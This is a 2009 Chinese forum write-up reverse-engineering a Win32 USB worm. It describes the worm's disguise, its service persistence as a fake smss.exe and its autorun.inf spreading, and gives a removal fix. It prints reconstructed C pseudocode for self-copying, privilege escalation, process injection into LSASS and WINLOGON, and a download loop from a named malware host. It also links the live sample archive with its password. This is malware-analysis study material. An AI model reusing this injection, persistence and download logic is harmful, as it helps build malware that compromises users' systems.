@@ -1,0 +1,203 @@
+
+
+# worm.win32 病毒逆向分析
+
+> 原文：[`www.pediy.com/kssd/pediy10/89935.html`](https://www.pediy.com/kssd/pediy10/89935.html)
+
+【文章标题】: worm.win32 病毒逆向分析  
+【文章作者】: moonife  
+【作者 QQ 号】: 765496322  
+【下载地址】: 附件 (病毒文件)  
+【编写语言】: Microsoft Visual C++ 6.0  
+【使用工具】:IDA pro,OllyDbg  
+【操作平台】: xp-sp3  
+【作者说明】:IDA 不会用，碰巧 U 盘里不知道那里带来的这个东西，就当是练下了，配合比较熟悉的 OllyDbg，动静结合，勉强弄来出来，不足之处还请各位指正！  
+【特别祝福】:祝各位端午节快乐，吃好，睡好！嘿嘿  
+//\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*病毒概述\*\*\*\*\*\*\*8\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+1 程序图标为一般文件夹图标，有一定的迷惑性，文件名为：重要文件..EXE 或 Important.FILES.EXE  
+2 感染成功后会把自身注册为系统服务实现自启动和后台运行  
+3 运行后注入系统进程，从病毒站点下载病毒并执行  
+4 检测移动盘和网络驱动盘进行传播，并生成 autorun.inf  
+5 如果你装了安全软件的话不要怕它的，作者并没有什么 anti 的功能，估计只是还在测试阶段，只是针对“裸奔”的用户有一定杀伤力的  
+6 解决办法：删除 C:\\WINDOWS\\system\\smss.exe ，停止和删除服务：Windows NT Service ，重启  
+//\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*逆向还原 C 代码\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+//有些函数防止乱玩，所以被省略了，嘿嘿。有兴趣的可以自己完成！  
+int \_\_stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)  
+{  
+char OrigModuleFileName\[260\]="";  
+char WindowsDirectory\[260\]=""  
+GetModuleFileName(NULL,OrigModuleFileName,260);  
+GetWindowsDirectory(WindowsDirectory,260);  
+DeCryptionData(addr\_0x14008064);//解密地址 14008064 处的字符串，addr\_0x14008064=\\system\\smss.exe  
+strcat(WindowsDirectory,addr\_0x14008064);//链接后的字符串：WindowsDirectory=C:\\WINDOWS\\system\\smss.exe  
+Encryptiondata(addr\_0x14008064);  
+if(strcmp(OrigModuleFileName,WindowsDirectory)!=0)//测试是否是 C:\\WINDOWS\\system\\smss.exe 这个路径的执行，不是的话只是复制到这个路径一个备份并执行！  
+{  
+DeCryptionData(addr\_0x14008044);//addr\_0x14008044=C:\\windwos.txt  
+if(strcmp(OrigModuleFileName,addr\_0x14008044)!=0)  
+{  
+DeCryptionData(addr\_0x14008054);//addr\_0x14008054=C:\\update..txt  
+if(strcmp(OrigModuleFileName,addr\_0x14008054)!=0)  
+{  
+undefine(OrigModuleFileName);  
+}  
+else  
+{  
+Sleep(12000);  
+DeleteServiceSlef();  
+Sleep(1000);  
+}  
+Encryptiondata(addr\_0x14008054);  
+SeetFileAttributes(WindowsDirectory,0x80);//设置正常属性  
+for(int i=10;i>0;i--)  
+  CopyFile(OrigModuleFileName,WindowsDirectory,0);  
+SeetFileAttributes(WindowsDirectory,7);//系统|只读|隐藏文件属性  
+wsprintf(cmdline,"cmd /c %s",WindowsDirectory);  
+WinExec(cmline,SW\_HIDE);  
+Encryptiondata(addr\_0x14008044);  
+exit(0);  
+}  
+else  
+{  
+Sleep(12000);  
+SeetFileAttributes(WindowsDirectory,0x80);//设置正常属性  
+DeleteServiceSlef();//这个是作者为了测试吗？，又见 beta 版！！！  
+Encryptiondata(addr\_0x14008044);  
+exit(0);  
+}  
+}  
+else  
+{  
+AsService(WindowsDirectory);如果是 C:\\WINDOWS\\system\\smss.exe 这个路径的执行，就开始进入正题！  
+exit(0);  
+}  
+}  
+//\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+void DeCryptionData(char \*data)//解密函数  
+{  
+int length=strlen(data),i=0;  
+for(;length>0;length--,i++)  
+    data\[i\]=(~data\[i\])⁰x7F;  
+}  
+//\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+void EnCryptionData(char \*data)//加密函数  
+{  
+int length=strlen(data),i=0;  
+for(;length>0;length--,i++)  
+    data\[i\]=~(data\[i\]⁰x7F);  
+}  
+  
+//\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+void AsService(char \*exedir)//正题函数  
+{  
+SERVICE\_STATUS ServiceStatus;//这些应该都是全局变量，声明在这里只是为了方便  
+SERVICE\_STATUS\_HANDLE hServiceStatus;  
+SERVICE\_TABLE\_ENTRY  servicetable\[2\];  
+DWORD idThread;  
+//call initstatus  
+hServiceStatus=0;  
+ServiceStatus.dwServiceType=0x10;  
+ServiceStatus.dwCurrentState=4;  
+ServiceStatus.dwControlsAccepted=1;  
+ServiceStatus.dwWin32ExitCode=0;  
+ServiceStatus.dwServiceSpecificExitCode=0;  
+ServiceStatus.dwCheckPoint=0;  
+ServiceStatus.dwWaitHint=0;  
+idThread=GetCurrentTreadId();  
+DeCryptionData(addr\_0x14008044);//addr\_0x14008044=NTservice  
+servicetable\[0\].lpServiceName=addr\_0x14008044;  
+servicetable\[0\].lpServiceProc=(LPSERVICE\_MAIN\_FUNCTION)ServiceMain;  
+servicetable\[1\].lpServiceName=NULL;  
+servicetable\[1\].lpServiceProc=NULL;  
+EnCryptionData(addr\_0x14008044);  
+creat\_config\_Service(exedir);//创建和配置服务，完成自动启动，这里就不逆了，就那么几步，读者自己完成！  
+//创建 Windows NT Service 服务，描述：For the security of Windows NT servies. An important System service, If it was terminated, Windows would be Collapsed.  
+//可执行文件路径：C:\\WINDOWS\\system\\smss.exe  启动类型当然是自动了。  
+StartServiceCtrlDispatcher(servicetable);  
+}  
+//\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+void ServiceMain()//服务主函数  
+{  
+DeCryptionData(addr\_0x14008044);//addr\_0x14008044=NTservice  
+SERVICE\_StATUS\_HANDLE hServiceStatus=RegisterServiceCtrlHandler(addr\_0x14008044,(LPHANDLER\_FUNCTION)HandlerProc);  
+EnCryptionData(addr\_0x14008044);  
+if(hServiceStatus)  
+{  
+SetServiceStatus(hServiceStatus,&ServiceStatus);  
+ServiceStatus.dwWin32ExitCode=0;  
+ServiceStatus.dwCheckPoint=0;  
+ServiceStatus.dwWaitHint=0;  
+ServiceStatus.dwCurrentState=4;  
+SetServiceStatus(hServiceStatus,&ServiceStatus);  
+Sleep(36000);  
+DeCryptionData(addr\_0x14008078);//addr\_0x14008078=LSASS.EXE  
+DeCryptionData(addr\_0x140080A4);//addr\_0x140080A4=WINLOGON.EXE  
+DeCryptionData(addr\_0x14008084);//addr\_0x14008084=EXPLORER.EXE  
+DeCryptionData(addr\_0x14008094);//addr\_0x14008094=SERVICES.EXE  
+int eax=Injection(addr\_0x14008078,TRUE,FALSE);//TRUE 表示执行远程线程,FLASE 指明是否已经感染成功  
+if(!eax)  
+{  
+eax=Injection(addr\_0x140080A4,TRUE,eax);  
+//继续如上判断，省略  
+}  
+else  
+{  
+ServiceStatus.dwCurrentState=1;  
+SetServiceStatus(hServiceStatus,&ServiceStatus);  
+ExitProcess(1);  
+}  
+Sleep(0x3E8)；  
+while(!DownVirus())  //从 paganini.3322.org 站点下载病毒文件，这个功能函数有兴趣可以自己完成，嘿嘿  
+Sleep(0x0FA0);  
+ServiceStatus.dwCurrentState=1;  
+SetServiceStatus(hServiceStatus,&ServiceStatus);  
+ExitProcess(1);  
+}  
+}  
+//\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+BOOL Injection(char \*name,int one,BOOL exec)//注入系统进程并执行远程线程  
+{  
+HANDLE hToken;  
+HANDlE ModuleHandle=GetModuleHandle(NULL);  
+OoenProcessToken(GetCurrentProcess(),TOKEN\_ADJUST\_PRIVILEGES,&hToken);  
+LookUpProcessPrivilege(hToken,addr\_SeDebugPrivilege,1);//访问权限提升，很多前辈介绍过，这里就不赘述了。  
+DWORD dwProcessId=GetDesProcID(name);  
+HANDLE hProcess=OpenProcess(PROCESS\_ALL\_ACCESS,TRUE,dwProcessId);  
+//以下是完成远程线程的写入并创建，代码省略：申请从一样的映像基址（14000000）开始的内存，把完整映像写入到远程进程，创建的线程函数地址为：14002EF0  
+}  
+//\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+void WINAPI HandlerProc(DWORD dwCtrl)//处理服务控制请求函数实现  
+{  
+if(dwCtrl==SERVICE\_CONTROL\_STOP)  
+{  
+ServiceStatus.dwCurrentState=3;  
+SetServiceStatus(hServiceStatus,&ServiceStatus);  
+PostThreadMessage(idThread,WM\_COLSE,0,0);  
+}  
+}  
+//\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+void RemoteTread(DWORD param)//远程线程函数：14002EF0，干坏事的来了！！！！  
+{  
+HANDLE hNewThread=CreateThread(NULL,0,addr\_14001AA0,\[esp+c\],0,NULL);//传播病毒功能线程,\[esp+c\]为 true or false  
+while(!DownVirus())  
+Sleep(0x0FA0);  
+Sleep(0x7D0);  
+WaitForSingleObject(hNewThread,INFINITE);//直到等线程结束，才关闭句柄  
+CloseHandle(hNewThread);  
+}  
+//\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+void SpreadVirusTread(DWORD param)//传播病毒功能函数线程  
+{  
+GetWindowsDirectory(WindowsDirectory,260);  
+DeCryptionData(addr\_0x14008064);//解密地址 14008064 处的字符串，addr\_0x14008064=\\system\\smss.exe  
+strcat(WindowsDirectory,addr\_0x14008064);//链接后的字符串：WindowsDirectory=C:\\WINDOWS\\system\\smss.exe  
+EnCryptionData(addr\_0x14008064);  
+HANDLE hFiel=CreateFile(WindowsDirectory,GENERIC\_READ,FILE\_SHARE\_READ,NULL,OPEN\_EXISTING,READONLY|HIDDEN|SYSTEM,NULL);  
+GetLogicalDrives();  
+//每 6 秒测试是否有移动存储器或网络驱动器的存在并传染和生成 autorun.inf。具体实现省略，防止乱玩，嘿嘿。可以自己完成！  
+}  
+//\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*THE END 2009-5-26 By:moonife\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+上传的附件
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || virus.rar\[解压密码：muma123\]  
+ |
